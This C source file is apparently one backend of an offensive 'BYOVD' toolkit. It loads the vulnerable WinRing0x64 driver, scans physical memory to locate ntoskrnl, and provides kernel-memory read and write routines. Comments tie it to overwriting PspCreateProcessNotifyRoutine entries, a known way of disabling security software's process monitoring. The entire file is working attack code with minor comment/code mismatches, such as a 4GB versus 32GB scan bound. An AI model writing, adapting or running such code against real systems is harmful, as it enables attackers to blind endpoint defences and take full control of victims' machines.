/*
 * backend_winring0x64.c -- JOCKY BYOVD: WinRing0x64.sys backend
 * byovd/kernel_subverter/backend_winring0x64.c
 *
 * Windows x64 | Clang | ring-3
 *
 * OpenLibSys WinRing0 v1.2.0.5 -- physical memory R/W via direct IOCTLs.
 * No MAP/UNMAP -- those IOCTLs do NOT exist in this binary (confirmed by scan).
 *
 * CONFIRMED IOCTL SURFACE (from binary scan):
 *   OLS_READ_MSR    0x9C402084  fn=0x821  ANY_ACCESS   sanity check (RDMSR)
 *   OLS_READ_MEM    0x9C4060C4  fn=0x831  READ_ACCESS  physical mem read
 *   OLS_WRITE_MEM   0x9C40A0C8  fn=0x832  WRITE_ACCESS physical mem write
 *
 * DEVICE NAME (confirmed from Unicode string scan):
 *   \Device\WinRing0_1_2_0 -> \\.\WinRing0_1_2_0
 *
 * READ_MEM STRUCT (input 16 bytes, output Count*4 bytes):
 *   +0x00  ULONGLONG  PhysicalAddress
 *   +0x08  DWORD      UnitSize  (1, 2, or 4 -- we always use 4)
 *   +0x0C  DWORD      Count     (number of units to read)
 *   Output: array of DWORD[Count]
 *
 * WRITE_MEM STRUCT (input 16 + Count*4 bytes, no output):
 *   +0x00  ULONGLONG  PhysicalAddress
 *   +0x08  DWORD      UnitSize  (always 4)
 *   +0x0C  DWORD      Count
 *   +0x10  DWORD[]    Data[Count]
 *
 * VA→PA STRATEGY
 * --------------
 * WinRing0 takes PHYSICAL addresses. We need to translate kernel VAs.
 * Approach:
 *   1. Read IA32_LSTAR MSR (0xC0000082) to confirm driver works
 *   2. Get ntoskrnl loaded KVA + SizeOfImage from NtQuerySystemInformation
 *   3. Physical scan: walk PA from 16MB to 4GB in 2MB steps
 *      At each step: read 4 bytes, check for MZ, verify SizeOfImage
 *   4. Cache offset: delta = ntoskrnl_pa - ntoskrnl_kva
 *   5. KVA→PA: pa = kva + delta  (valid for all addrs in ntoskrnl image)
 *
 * PspCreateProcessNotifyRoutine lives in ntoskrnl .data -- always in range.
 */

#include "byovd_interface.h"
#include <windows.h>
#include <psapi.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ── confirmed IOCTLs (from binary probe) ───────────────────────────────── */
#define OLS_IOCTL_READ_MSR   0x9C402084UL
#define OLS_IOCTL_READ_MEM   0x9C4060C4UL
#define OLS_IOCTL_WRITE_MEM  0x9C40A0C8UL

/* ── device + service (from Unicode string scan) ────────────────────────── */
#define OLS_DEVICE    "\\\\.\\WinRing0_1_2_0"
#define OLS_SVC_NAME  "WinRing0_1_2_0"

/* ── IOCTL structs ──────────────────────────────────────────────────────── */
#pragma pack(push, 1)

typedef struct {
    DWORD Index;      /* MSR index */
} OLS_MSR_IN;        /* 4 bytes */

typedef struct {
    DWORD EaxLo;
    DWORD EdxHi;
} OLS_MSR_OUT;       /* 8 bytes */

typedef struct {
    ULONGLONG PhysicalAddress;  /* +0x00 */
    DWORD     UnitSize;         /* +0x08  always 4 */
    DWORD     Count;            /* +0x0C  units to transfer */
} OLS_MEM_IN;                  /* 16 bytes — used as input for read + write */

/* write: OLS_MEM_IN immediately followed by Count DWORDs of data */
typedef struct {
    ULONGLONG PhysicalAddress;
    DWORD     UnitSize;
    DWORD     Count;
    DWORD     Data[2];          /* inline data — enough for 8-byte writes */
} OLS_WRITE_IN;                 /* 24 bytes max for 8-byte writes */

#pragma pack(pop)

/* ── private context ────────────────────────────────────────────────────── */
typedef struct {
    uint64_t  ntoskrnl_kva;
    uint64_t  ntoskrnl_pa;
    uint64_t  ntoskrnl_size;
    int64_t   kva_pa_delta;    /* signed: pa = kva + delta */
    BOOL      pa_resolved;
} winring0_ctx_t;

/* ════════════════════════════════════════════════════════════════════════
   INTERNAL: raw physical r/w
   ════════════════════════════════════════════════════════════════════════ */

/*
 * _phy_read4 -- read one DWORD from physical address `pa`.
 * Returns TRUE on success. `*out` receives the value.
 *
 * *the window into physical memory opens and closes in one IOCTL —
 *  no mapping stays resident, nothing lingers in the TLB*
 */
static BOOL _phy_read4(HANDLE dev, uint64_t pa, DWORD *out)
{
    OLS_MEM_IN in  = { .PhysicalAddress = pa, .UnitSize = 4, .Count = 1 };
    DWORD      val = 0;
    DWORD      ret = 0;

    BOOL ok = DeviceIoControl(dev,
                               OLS_IOCTL_READ_MEM,
                               &in,  sizeof(in),
                               &val, sizeof(val),
                               &ret, NULL);
    if (ok) *out = val;
    return ok;
}

/*
 * _phy_write4 -- write one DWORD to physical address `pa`.
 */
static BOOL _phy_write4(HANDLE dev, uint64_t pa, DWORD val)
{
    OLS_WRITE_IN in = {
        .PhysicalAddress = pa,
        .UnitSize        = 4,
        .Count           = 1,
        .Data            = { val, 0 }
    };
    DWORD ret = 0;

    return DeviceIoControl(dev,
                            OLS_IOCTL_WRITE_MEM,
                            &in,  sizeof(ULONGLONG) + sizeof(DWORD)*2 + sizeof(DWORD),
                            NULL, 0,
                            &ret, NULL);
}

/* ════════════════════════════════════════════════════════════════════════
   INTERNAL: VA→PA resolution
   ════════════════════════════════════════════════════════════════════════ */

static BOOL _get_ntoskrnl_info(uint64_t *kva_out, uint64_t *size_out)
{
    /* EnumDeviceDrivers: ntoskrnl is always index 0.
     * Documented stable API -- no NtQSI struct layout guessing. */
    LPVOID kbases[512] = {0};
    DWORD  needed      = 0;

    if (!EnumDeviceDrivers(kbases, sizeof(kbases), &needed) || !needed) {
        printf("[winring0] EnumDeviceDrivers failed: %lu\n", GetLastError());
        return FALSE;
    }
    *kva_out = (uint64_t)(uintptr_t)kbases[0];

    /* SizeOfImage from PE header on disk */
    *size_out = 0;
    HANDLE f = CreateFileA("C:\\Windows\\System32\\ntoskrnl.exe",
                            GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        HANDLE m = CreateFileMappingA(f, NULL, PAGE_READONLY, 0, 0, NULL);
        if (m) {
            uint8_t *base = (uint8_t *)MapViewOfFile(m, FILE_MAP_READ, 0, 0, 0);
            if (base) {
                IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
                IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
                *size_out = nt->OptionalHeader.SizeOfImage;
                UnmapViewOfFile(base);
            }
            CloseHandle(m);
        }
        CloseHandle(f);
    }
    if (!*size_out) { *size_out = 0x2000000; }

    printf("[winring0] ntoskrnl KVA=0x%016llX  size=0x%llX\n",
           (unsigned long long)*kva_out, (unsigned long long)*size_out);
    return (*kva_out != 0);
}

/*
 * _scan_ntoskrnl_pa -- physical scan for ntoskrnl base.
 *
 * Walks PA from 16MB to 4GB in 2MB steps.
 * At each candidate: read first DWORD, check MZ, then verify SizeOfImage.
 * Requires only 3 IOCTLs per candidate on a match — typically <200 probes.
 *
 * MmMapIoSpace inside WinRing0 returns NULL for unmapped PAs —
 * the driver returns an IOCTL error rather than faulting, so we
 * can scan freely without BSOD risk.
 */
static BOOL _scan_ntoskrnl_pa(HANDLE    dev,
                                uint64_t  expected_size,
                                uint64_t *pa_out)
{
    const uint64_t START = 0x1000000ULL;       /* 16 MB  */
    const uint64_t END   = 0x800000000ULL;     /* 32 GB  */
    const uint64_t STEP  = 0x200000ULL;        /* 2 MB   */

    printf("[winring0] scanning PA 0x%llX–0x%llX step=2MB "
           "expected_size=0x%llX...\n",
           (unsigned long long)START,
           (unsigned long long)END,
           (unsigned long long)expected_size);

    uint32_t probes = 0;

    for (uint64_t pa = START; pa < END; pa += STEP) {
        DWORD dw0 = 0;
        probes++;
        if (probes % 512 == 0)
            printf("[winring0]   scan progress: PA=0x%09llX  probes=%u\n",
                   (unsigned long long)pa, probes);

        /* read first 4 bytes — check for MZ signature */
        if (!_phy_read4(dev, pa, &dw0)) continue;
        if ((dw0 & 0xFFFF) != 0x5A4D) continue; /* 'MZ' as WORD LE */

        /* MZ found — read e_lfanew at +0x3C */
        DWORD e_lfanew = 0;
        if (!_phy_read4(dev, pa + 0x3C, &e_lfanew)) continue;
        if (e_lfanew < 0x40 || e_lfanew > 0x400) continue; /* sanity */

        /* check PE signature at e_lfanew */
        DWORD pe_sig = 0;
        if (!_phy_read4(dev, pa + e_lfanew, &pe_sig)) continue;
        if (pe_sig != 0x00004550) continue; /* 'PE\0\0' */

        /* SizeOfImage at OptionalHeader+0x38, OptionalHeader at e_lfanew+0x18
         * SizeOfImage offset from PE header: 0x18 (OptHdr) + 0x38 = 0x50 */
        DWORD soi = 0;
        if (!_phy_read4(dev, pa + e_lfanew + 0x50, &soi)) continue;
        if (soi != (DWORD)expected_size) continue;

        printf("[winring0] ntoskrnl found: PA=0x%016llX  SizeOfImage=0x%X  "
               "probes=%u\n",
               (unsigned long long)pa, soi, probes);
        *pa_out = pa;
        return TRUE;
    }

    printf("[winring0] ntoskrnl not found in first 4GB (%u probes)\n", probes);
    return FALSE;
}

/* ════════════════════════════════════════════════════════════════════════
   VTABLE IMPLEMENTATIONS
   ════════════════════════════════════════════════════════════════════════ */

static byovd_result_t winring0_load(byovd_backend_t *self)
{
    char nt_path[MAX_PATH + 8] = {0};
    snprintf(nt_path, sizeof(nt_path) - 1, "\\??\\%s", self->driver_path);

    printf("[winring0] loading: %s\n", self->driver_path);

    SC_HANDLE hScm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hScm) {
        printf("[winring0] OpenSCManager failed: %lu\n", GetLastError());
        return BYOVD_ERR_LOAD;
    }

    /* remove any stale registration */
    SC_HANDLE hStale = OpenServiceA(hScm, self->svc_name, SERVICE_ALL_ACCESS);
    if (hStale) {
        SERVICE_STATUS ss = {0};
        ControlService(hStale, SERVICE_CONTROL_STOP, &ss);
        Sleep(300);
        DeleteService(hStale);
        CloseServiceHandle(hStale);
        Sleep(300);
        printf("[winring0] stale service removed\n");
    }

    SC_HANDLE hSvc = CreateServiceA(
        hScm,
        self->svc_name, self->svc_name,
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        nt_path,
        NULL, NULL, NULL, NULL, NULL);

    if (!hSvc) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS)
            hSvc = OpenServiceA(hScm, self->svc_name, SERVICE_ALL_ACCESS);
        if (!hSvc) {
            printf("[winring0] CreateService failed: %lu\n", err);
            CloseServiceHandle(hScm);
            return BYOVD_ERR_LOAD;
        }
    }

    if (!StartServiceA(hSvc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[winring0] StartService failed: %lu", err);
            switch (err) {
                case    2: printf(" (file not found -- bad path)");      break;
                case    5: printf(" (access denied -- HVCI on?)");       break;
                case 1275: printf(" (CI.dll blocklist)");                break;
                case  577: printf(" (Authenticode rejected)");           break;
            }
            printf("\n");
            DeleteService(hSvc);
            CloseServiceHandle(hSvc);
            CloseServiceHandle(hScm);
            return BYOVD_ERR_LOAD;
        }
    }

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hScm);
    Sleep(400);
    printf("[winring0] driver loaded\n");
    return BYOVD_OK;
}

static byovd_result_t winring0_open(byovd_backend_t *self)
{
    winring0_ctx_t *ctx = (winring0_ctx_t *)self->private_ctx;

    /* confirmed device name from binary scan */
    self->device = CreateFileA(
        OLS_DEVICE,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL);

    if (self->device == INVALID_HANDLE_VALUE) {
        printf("[winring0] CreateFile(%s) failed: %lu\n",
               OLS_DEVICE, GetLastError());
        return BYOVD_ERR_OPEN;
    }
    printf("[winring0] device handle: %p\n", (void *)self->device);

    /* sanity: read IA32_LSTAR (0xC0000082) — confirms IOCTL surface works */
    OLS_MSR_IN  msrin  = { .Index = 0xC0000082 };
    OLS_MSR_OUT msrout = { 0 };
    DWORD       ret    = 0;

    BOOL ok = DeviceIoControl(self->device,
                               OLS_IOCTL_READ_MSR,
                               &msrin,  sizeof(msrin),
                               &msrout, sizeof(msrout),
                               &ret, NULL);
    if (!ok) {
        printf("[winring0] MSR read sanity check FAILED: %lu\n", GetLastError());
        printf("[winring0] IOCTL 0x%08X rejected -- wrong driver build?\n",
               OLS_IOCTL_READ_MSR);
        CloseHandle(self->device);
        self->device = INVALID_HANDLE_VALUE;
        return BYOVD_ERR_OPEN;
    }

    uint64_t lstar = ((uint64_t)msrout.EdxHi << 32) | msrout.EaxLo;
    printf("[winring0] IA32_LSTAR (KiSystemCall64): 0x%016llX  -- IOCTLs confirmed\n",
           (unsigned long long)lstar);

    /* get ntoskrnl KVA + size from NtQSI */
    if (!_get_ntoskrnl_info(&ctx->ntoskrnl_kva, &ctx->ntoskrnl_size)) {
        printf("[winring0] ntoskrnl info query failed\n");
        CloseHandle(self->device);
        self->device = INVALID_HANDLE_VALUE;
        return BYOVD_ERR_OPEN;
    }
    printf("[winring0] ntoskrnl KVA=0x%016llX  size=0x%llX\n",
           (unsigned long long)ctx->ntoskrnl_kva,
           (unsigned long long)ctx->ntoskrnl_size);

    /* physical scan — find ntoskrnl PA */
    if (!_scan_ntoskrnl_pa(self->device,
                            ctx->ntoskrnl_size,
                            &ctx->ntoskrnl_pa))
    {
        printf("[winring0] physical scan FAILED -- cannot resolve KVA→PA\n");
        CloseHandle(self->device);
        self->device = INVALID_HANDLE_VALUE;
        return BYOVD_ERR_OPEN;
    }

    /* compute signed delta: pa = kva + delta */
    ctx->kva_pa_delta = (int64_t)ctx->ntoskrnl_pa
                      - (int64_t)ctx->ntoskrnl_kva;
    ctx->pa_resolved  = TRUE;

    printf("[winring0] KVA→PA delta: 0x%016llX\n",
           (unsigned long long)(uint64_t)ctx->kva_pa_delta);
    printf("[winring0] physical r/w armed\n");
    return BYOVD_OK;
}

static void winring0_close(byovd_backend_t *self)
{
    if (self->device != INVALID_HANDLE_VALUE) {
        CloseHandle(self->device);
        self->device = INVALID_HANDLE_VALUE;
    }
}

static byovd_result_t winring0_unload(byovd_backend_t *self)
{
    winring0_close(self);

    SC_HANDLE hScm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hScm) return BYOVD_ERR_UNLOAD;

    SC_HANDLE hSvc = OpenServiceA(hScm, self->svc_name, SERVICE_ALL_ACCESS);
    byovd_result_t r = BYOVD_ERR_UNLOAD;
    if (hSvc) {
        SERVICE_STATUS ss = {0};
        ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
        Sleep(300);
        if (DeleteService(hSvc)) r = BYOVD_OK;
        CloseServiceHandle(hSvc);
        printf("[winring0] driver unloaded\n");
    }
    CloseServiceHandle(hScm);
    return r;
}

/*
 * _kva_to_pa -- translate kernel VA to physical address.
 * Valid ONLY for addresses inside ntoskrnl image.
 * PspCreateProcessNotifyRoutine is in ntoskrnl .data: always valid.
 */
static BOOL _kva_to_pa(winring0_ctx_t *ctx,
                        uintptr_t       kva,
                        uint64_t       *pa_out)
{
    if (!ctx->pa_resolved) return FALSE;

    /* bounds check: must be within ntoskrnl image */
    uint64_t offset = (uint64_t)kva - ctx->ntoskrnl_kva;
    if (offset >= ctx->ntoskrnl_size) {
        printf("[winring0] KVA 0x%016llX outside ntoskrnl "
               "[0x%016llX + 0x%llX]\n",
               (unsigned long long)kva,
               (unsigned long long)ctx->ntoskrnl_kva,
               (unsigned long long)ctx->ntoskrnl_size);
        return FALSE;
    }

    *pa_out = (uint64_t)((int64_t)kva + ctx->kva_pa_delta);
    return TRUE;
}

/*
 * winring0_read -- read 1/2/4/8 bytes from kernel VA `addr`.
 *
 * Translates KVA→PA, issues direct READ_MEMORY IOCTL(s).
 * 8-byte reads = two 4-byte IOCTLs (lo then hi).
 *
 * *the physical substrate has no concept of ring levels —
 *  bytes are bytes, addresses are addresses, ownership is fiction*
 */
static byovd_result_t winring0_read(byovd_backend_t *self,
                                     uintptr_t        addr,
                                     void            *buf,
                                     size_t           size)
{
    winring0_ctx_t *ctx = (winring0_ctx_t *)self->private_ctx;
    uint64_t pa = 0;

    if (!_kva_to_pa(ctx, addr, &pa)) return BYOVD_ERR_READ;

    if (size <= 4) {
        DWORD val = 0;
        if (!_phy_read4(self->device, pa, &val)) {
            printf("[winring0] read%zu(PA=0x%016llX) failed: %lu\n",
                   size, (unsigned long long)pa, GetLastError());
            return BYOVD_ERR_READ;
        }
        memcpy(buf, &val, size);
        return BYOVD_OK;
    }

    /* 8-byte: lo DWORD first, then hi DWORD */
    DWORD lo = 0, hi = 0;
    if (!_phy_read4(self->device, pa,     &lo)) {
        printf("[winring0] read8 lo(PA=0x%016llX) failed: %lu\n",
               (unsigned long long)pa, GetLastError());
        return BYOVD_ERR_READ;
    }
    if (!_phy_read4(self->device, pa + 4, &hi)) {
        printf("[winring0] read8 hi(PA=0x%016llX) failed: %lu\n",
               (unsigned long long)(pa + 4), GetLastError());
        return BYOVD_ERR_READ;
    }

    uint64_t val64 = ((uint64_t)hi << 32) | (uint64_t)lo;
    memcpy(buf, &val64, 8);
    return BYOVD_OK;
}

/*
 * winring0_write -- write 1/2/4/8 bytes to kernel VA `addr`.
 *
 * The physical write goes through the CPU write-back cache —
 * the kernel sees the change on the next cache miss.
 * For zeroing EX_FAST_REF slots, this is immediate in practice.
 */
static byovd_result_t winring0_write(byovd_backend_t *self,
                                      uintptr_t        addr,
                                      const void      *buf,
                                      size_t           size)
{
    winring0_ctx_t *ctx = (winring0_ctx_t *)self->private_ctx;
    uint64_t pa = 0;

    if (!_kva_to_pa(ctx, addr, &pa)) return BYOVD_ERR_WRITE;

    if (size <= 4) {
        DWORD val = 0;
        memcpy(&val, buf, size);
        if (!_phy_write4(self->device, pa, val)) {
            printf("[winring0] write%zu(PA=0x%016llX) failed: %lu\n",
                   size, (unsigned long long)pa, GetLastError());
            return BYOVD_ERR_WRITE;
        }
        return BYOVD_OK;
    }

    /* 8-byte: lo then hi */
    uint64_t val64 = 0;
    memcpy(&val64, buf, 8);

    if (!_phy_write4(self->device, pa,     (DWORD)( val64        & 0xFFFFFFFF))) {
        printf("[winring0] write8 lo(PA=0x%016llX) failed: %lu\n",
               (unsigned long long)pa, GetLastError());
        return BYOVD_ERR_WRITE;
    }
    if (!_phy_write4(self->device, pa + 4, (DWORD)((val64 >> 32) & 0xFFFFFFFF))) {
        printf("[winring0] write8 hi(PA=0x%016llX) failed: %lu\n",
               (unsigned long long)(pa + 4), GetLastError());
        return BYOVD_ERR_WRITE;
    }
    return BYOVD_OK;
}

/* ════════════════════════════════════════════════════════════════════════
   PUBLIC: BACKEND INIT
   ════════════════════════════════════════════════════════════════════════ */

byovd_backend_t *winring0_backend_init(const char *driver_path)
{
    byovd_backend_t *b   = (byovd_backend_t  *)calloc(1, sizeof(*b));
    winring0_ctx_t  *ctx = (winring0_ctx_t   *)calloc(1, sizeof(*ctx));
    if (!b || !ctx) { free(b); free(ctx); return NULL; }

    b->name        = "WinRing0x64";
    b->device      = INVALID_HANDLE_VALUE;
    b->private_ctx = ctx;

    strncpy(b->svc_name,    OLS_SVC_NAME, sizeof(b->svc_name)    - 1);
    strncpy(b->device_path, OLS_DEVICE,   sizeof(b->device_path) - 1);

    if (!GetFullPathNameA(driver_path, MAX_PATH, b->driver_path, NULL)) {
        printf("[winring0] GetFullPathNameA failed: %lu\n", GetLastError());
        free(ctx); free(b); return NULL;
    }
    if (GetFileAttributesA(b->driver_path) == INVALID_FILE_ATTRIBUTES) {
        printf("[winring0] driver not found: %s\n", b->driver_path);
        free(ctx); free(b); return NULL;
    }

    b->ops.load   = winring0_load;
    b->ops.open   = winring0_open;
    b->ops.close  = winring0_close;
    b->ops.unload = winring0_unload;
    b->ops.read   = winring0_read;
    b->ops.write  = winring0_write;

    printf("[winring0] backend initialised -- driver: %s\n", b->driver_path);
    return b;
}